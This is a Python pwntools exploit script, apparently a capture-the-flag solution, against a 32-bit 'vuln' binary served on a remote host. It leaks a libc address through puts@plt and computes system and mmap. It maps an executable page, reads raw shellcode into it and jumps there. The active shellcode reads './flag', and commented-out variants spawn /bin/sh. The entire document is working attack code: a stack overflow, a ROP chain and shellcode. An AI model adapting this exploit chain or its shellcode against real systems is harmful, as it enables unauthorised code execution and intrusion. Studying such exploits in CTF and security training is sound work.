import time, sys
from pwn import *

# local process envirnoment
LOCAL = False

#retmote args
remote_host = "118.31.18.145"
remote_port = 20004

elf_sanbox = ELF("sandbox")
elf_vuln = ELF("./vuln")

context.clear(arch='i386')

argv = ["./sandbox", "./vuln"]

if LOCAL:
    context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "./libc.so.6:/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "./libc.so.6"
    io = process(argv, env=mine_env)
    #io = process("./vuln", env=mine_env)
    libc = ELF("./libc.so.6")
else:
    libc = ELF("./libc.so.6")
    io = remote(remote_host, remote_port)

def s_exp():
    bss_tdatddr = 0x804A064
    main_addr = 0x804865B
    vuln_func = 0x80485CB

    payload='a'*0x30+chr(0x48)
    payload+=p32(elf_vuln.plt["puts"]) + p32(vuln_func)
    payload+=p32(elf_vuln.got["read"])
    io.sendline(payload)
    io.recvline()
    data = io.recv(4)
    read_addr = u32(data)
    libc.address = read_addr-libc.symbols["read"]
    system_addr = libc.symbols["system"]
    mmap_addr = libc.symbols["mmap"]

    log.info("libc addr:"+hex(libc.address))
    log.info("mmap:"+hex(mmap_addr))
    log.info("system addr:"+hex(system_addr))

    mped_addr = 0x23330000

    payload='a'*0x30+chr(0x48)
    payload += p32(mmap_addr) + p32(vuln_func)
    payload += p32(mped_addr) + p32(0x1000) + p32(7) + p32(0x22) + p32(0) + p32(0)
    io.sendline(payload)

    pause()


    #shellcode = "j3h\x08\x003#\xcbH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01H1\x04$j\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j{Xj\x01_\x99\x0f\x05"
    #shellcode = "H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01H1\x04$j\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j{Xj\x01_\x99\x0f\x05"

    #shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    #shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    #shellprod = pwnlib.shellcraft.i386.linux.cat("./flag")
    print pwnlib.shellcraft.i386.linux.cat("./flag").strip()
    print pwnlib.shellcraft.i386.linux.sh().strip()
    # cat flag
    shellcode = 'h\x01\x01\x01\x01\x814$`f\x01\x01h./fl\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80'
    #shellcode = 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
    payload='a'*0x30+chr(0x48)
    payload += p32(elf_vuln.plt["read"]) + p32(mped_addr)
    payload += p32(0) + p32(mped_addr) + p32(len(shellcode))
    io.sendline(payload)
    
    time.sleep(0.01)
    io.send(shellcode)
    time.sleep(0.01)

    #io.recvall()
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
